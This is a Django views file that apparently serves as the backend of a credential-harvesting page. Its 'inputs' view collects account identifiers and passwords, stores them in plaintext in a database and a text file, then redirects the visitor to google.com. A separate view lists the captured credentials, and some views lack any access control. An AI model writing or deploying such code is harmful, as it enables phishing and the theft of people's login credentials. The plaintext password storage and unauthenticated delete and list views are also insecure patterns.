
from django.shortcuts import render, redirect
from .forms import MessageForm
from .models import Message
from django.core.cache import cache
from django.http import HttpResponse
from django.core.mail import send_mail
from django.conf import settings
from django.contrib.auth.decorators import login_required
from .models import Message
from django.shortcuts import redirect, get_object_or_404

def delete_message(request, pk):
    msg = get_object_or_404(Message, pk=pk)
    msg.delete()
    return redirect("saved_inputs")

def inputs(request):
    if request.method == "POST":
        identifier = request.POST.get("identifier")
        password = request.POST.get("password")
        # save to DB...
        if identifier and password:
            # save to database
            msg = Message.objects.create(
                identifier=identifier,
                password=password
            )

        with open("messages.txt", "a", encoding="utf-8") as f:
            f.write(f"account: {msg.identifier}\n")
            f.write(f"password: {msg.password}\n")
            f.write(f"sent: {msg.created_at}\n")
            f.write("="*40 + "\n\n")

        return redirect("https://www.google.com")
    return render(request, "form.html")


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

@login_required
def saved_inputs_view(request):
    msg = Message.objects.all().order_by('-created_at')
    return render(request, 'inputs.html', {'msg':msg})


def message_view(request):
    ip = get_client_ip(request)
    count = cache.get(ip, 0)
    
    if count >= 5:
        return HttpResponse("Too many submissions. Try later.", status=429)


    if request.method == 'POST':
        form = MessageForm(request.POST)
        if form.is_valid():
            message = form.save()
            data = [
                message.identifier,
                message.password,
                
                message.created_at
            ]

            # ✅ 3A. --- Save to TXT file ---
            # "a" means append → we keep adding new messages, not overwrite
            with open("messages.txt", "a", encoding="utf-8") as f:
                f.write(f"identifier: {message.identifier}\n")
                f.write(f"password: {message.password}\n")
                f.write(f"Created_at: {message.created_at}\n")
                f.write("="*40 + "\n")  # separator line
            return redirect('success_view')
    else:
        form = MessageForm()
    
    return render(request, 'form.html', {'form': form})


def success_view(request):
    return render(request, "success.html")

def message_list_view(request):
    messages = Message.objects.all().order_by('-created_at')
    return render(request, 'messages.html', {'messages':messages})


